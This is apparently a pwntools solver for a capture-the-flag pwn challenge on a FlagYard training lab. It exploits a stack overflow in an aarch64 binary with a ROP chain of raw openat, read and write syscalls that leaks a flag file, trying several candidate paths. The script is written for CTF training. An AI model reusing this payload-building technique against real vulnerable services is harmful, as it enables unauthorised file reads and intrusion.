#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MRA  -  FlagYard Pwn solver

mra (FlagYard Training Labs, Pwn / SAFCSP) - aarch64 binary with a form-fill
stack overflow. ROP + raw syscall chain:

    openat(AT_FDCWD, path, 0)  ->  read(fd=3, buf, 0x100)  ->  write(1, buf)

The write leaks whichever flag file path is opened; a small candidate list is
bruted so it runs on any instance.

Target is given as host:port (default tcp.flagyard.com:21290).
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

context.arch = 'aarch64'

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("M R A   S O L V E R",
              "aarch64 ROP -> openat/read/write -> flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
        return argv[1].strip()
    raw = input("  Enter the MRA challenge target (host:port): ").strip()
    return raw or "tcp.flagyard.com:21290"

def parse_target(raw):
    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "21290"
    return host, int(port_s)

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

# ---------------------------------------------------------------------------
# gadgets / constants
# ---------------------------------------------------------------------------
G_X0 = 0x400808   # ldp x0, x3, [sp], #0x10 ; br x3
G_X1 = 0x400810   # ldp x1, x3, [sp], #0x10 ; br x3
G_X2 = 0x400818   # ldp x2, x3, [sp], #0x10 ; br x3
G_X8 = 0x400820   # ldp x8, x3, [sp], #0x10 ; br x3
G_SVC = 0x400828  # svc #0
MENU = 0x400940

X_OPENAT = 56
X_READ = 63
X_WRITE = 64
AT_FDCWD = -100

CANDIDATES = [b'/flag\x00', b'/flag.txt\x00', b'/home/ctf/flag\x00',
              b'/app/flag\x00', b'/chall/flag\x00', b'./flag\x00']


def p64(x):
    return bytes([(x >> s) & 0xff for s in range(0, 64, 8)])


def enter_fill_form(p):
    p.recvuntil(b'Choice: ', timeout=5)
    p.sendline(b'2')
    d = p.recvuntil(b'Enter ur First Name (max 6 chars): ', timeout=5)
    leak = int(d.split(b'hint: ')[1].split(b'\n')[0], 16)
    p.sendline(b'AAAA')
    p.recvuntil(b'Enter ur Last Name (max 6 chars): ', timeout=5)
    return leak


def build_one_syscall(buf, sysno, x0, x1, x2, menu_bridge=True):
    payload = bytearray(0xff)
    payload[0x0c:0x14] = p64(0)          # saved x29
    payload[0x14:0x1c] = p64(G_X0)       # saved x30
    payload[0x1c:0x24] = p64(x0)
    payload[0x24:0x2c] = p64(G_X1)
    payload[0x2c:0x34] = p64(x1)
    payload[0x34:0x3c] = p64(G_X2)
    payload[0x3c:0x44] = p64(x2)
    payload[0x44:0x4c] = p64(G_X8)
    payload[0x4c:0x54] = p64(sysno)
    payload[0x54:0x5c] = p64(G_SVC)
    if menu_bridge:
        payload[0x8c:0x94] = p64(0)
        payload[0x94:0x9c] = p64(G_X1)
        payload[0x9c:0xa4] = p64(0)
        payload[0xa4:0xac] = p64(G_X2)
        payload[0xac:0xb4] = p64(0)
        payload[0xb4:0xbc] = p64(G_X8)
        payload[0xbc:0xc4] = p64(0)
        payload[0xc4:0xcc] = p64(MENU)
    return bytes(payload)


def build_read_write(buf):
    dest = buf + 0x110
    payload = bytearray(0xff)
    payload[0x0c:0x14] = p64(0)
    payload[0x14:0x1c] = p64(G_X0)
    payload[0x1c:0x24] = p64(3)          # fd (assumed /flag -> fd3)
    payload[0x24:0x2c] = p64(G_X1)
    payload[0x2c:0x34] = p64(dest)
    payload[0x34:0x3c] = p64(G_X2)
    payload[0x3c:0x44] = p64(0x100)
    payload[0x44:0x4c] = p64(G_X8)
    payload[0x4c:0x54] = p64(X_READ)
    payload[0x54:0x5c] = p64(G_SVC)
    payload[0x8c:0x94] = p64(1)          # fd stdout
    payload[0x94:0x9c] = p64(G_X1)
    payload[0x9c:0xa4] = p64(dest)
    payload[0xa4:0xac] = p64(G_X2)
    payload[0xac:0xb4] = p64(0x100)
    payload[0xb4:0xbc] = p64(G_X8)
    payload[0xbc:0xc4] = p64(X_WRITE)
    payload[0xc4:0xcc] = p64(G_SVC)
    return bytes(payload)


def try_flag_path(host, port, path):
    p = remote(host, port, timeout=10)
    # Session A: openat(path)
    leakA = enter_fill_form(p)
    bufA = leakA - 6
    path_addr = bufA + 0x5c
    pa = build_one_syscall(bufA, X_OPENAT, AT_FDCWD, path_addr, 0, menu_bridge=True)
    pp = bytearray(pa)
    pp[0x5c:0x5c + len(path)] = path
    p.send(bytes(pp))

    # back at menu
    p.recvuntil(b'Choice: ', timeout=5)
    # Session B: read + write (crash after)
    leakB = enter_fill_form(p)
    bufB = leakB - 6
    pb = build_read_write(bufB)
    p.send(bytes(pb))
    out = p.recvall(timeout=5)
    p.close()
    return out


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = 'error'

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge target given")
        return
    host, port = parse_target(raw)
    step("target host %s:%d" % (host, port))

    total = len(CANDIDATES)
    for i, path in enumerate(CANDIDATES):
        step("openat(%s) + read + write  (path %d/%d)" %
             (path.rsplit(b'\x00', 1)[0].decode(), i + 1, total))
        try:
            out = try_flag_path(host, port, path)
        except Exception as e:
            fail("connection/exploit error: %s" % (e,))
            continue

        flag = read_flag(out)
        if flag:
            tick(0.85, "flag leaked via openat/read/write chain")
            print()
            ok("FLAG = %s" % flag)

            big_flag(flag, time.time() - t0)
            outp = Path(__file__).resolve().parent / "flag_from_mra.txt"
            outp.write_text(flag + "\n", encoding="utf-8")
            print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
            return

        ok("tried %-16s got %d bytes (no flag)" %
           (path.rsplit(b'\x00', 1)[0].decode(), len(out)))

    fail("no flag in the candidate list \u2014 try other paths or a fresh instance.")


if __name__ == "__main__":
    main()